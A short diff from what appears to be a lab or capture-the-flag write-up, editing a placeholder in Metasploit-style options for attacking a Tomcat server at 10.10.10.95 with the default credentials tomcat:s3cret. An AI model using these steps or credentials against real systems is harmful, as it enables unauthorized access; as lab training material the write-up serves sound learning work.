@@ -42,7 +42,7 @@ tomcat:s3cret
 <img width="1075" height="292" alt="image" src="https://github.com/user-attachments/assets/1ee2d573-d700-4815-8863-d176d8166f2e" />
 
 ### I set the (TARGETS) on Windows , and for options i use :
-- set lhost <YOUR IP>
+- set lhost <YOUR $IP>
 - set rhost 10.10.10.95
 - set HttpUsername tomcat
 - set HttpPassword s3cret
